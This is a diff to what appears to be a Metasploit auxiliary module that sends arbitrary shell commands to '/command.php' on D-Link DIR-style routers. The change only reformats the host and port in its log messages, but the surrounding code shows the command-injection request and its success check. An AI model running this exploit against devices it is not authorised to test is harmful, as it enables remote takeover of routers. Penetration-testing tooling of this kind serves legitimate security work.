@@ -49,7 +49,7 @@ class MetasploitModule < Msf::Auxiliary
   def run
     uri = '/command.php'
 
-    print_status("#{rhost}:#{rport} - Sending remote command: " + datastore['CMD'])
+    print_status("#{Rex::Socket.to_authority(rhost, rport)} - Sending remote command: " + datastore['CMD'])
 
     data_cmd = "cmd=#{datastore['CMD']}; echo end"
 
@@ -65,16 +65,16 @@ class MetasploitModule < Msf::Auxiliary
       return if res.headers['Server'].nil? || res.headers['Server'] !~ %r{Linux,\ HTTP/1.1,\ DIR}
       return if res.code == 404
     rescue ::Rex::ConnectionError
-      vprint_error("#{rhost}:#{rport} - Failed to connect to the web server")
+      vprint_error("#{Rex::Socket.to_authority(rhost, rport)} - Failed to connect to the web server")
       return
     end
 
     if res.body.include?('end')
-      print_good("#{rhost}:#{rport} - Exploited successfully\n")
-      print_line("#{rhost}:#{rport} - Command: #{datastore['CMD']}\n")
-      print_line("#{rhost}:#{rport} - Output: #{res.body}")
+      print_good("#{Rex::Socket.to_authority(rhost, rport)} - Exploited successfully\n")
+      print_line("#{Rex::Socket.to_authority(rhost, rport)} - Command: #{datastore['CMD']}\n")
+      print_line("#{Rex::Socket.to_authority(rhost, rport)} - Output: #{res.body}")
     else
-      print_error("#{rhost}:#{rport} - Exploit failed")
+      print_error("#{Rex::Socket.to_authority(rhost, rport)} - Exploit failed")
     end
   end
 end
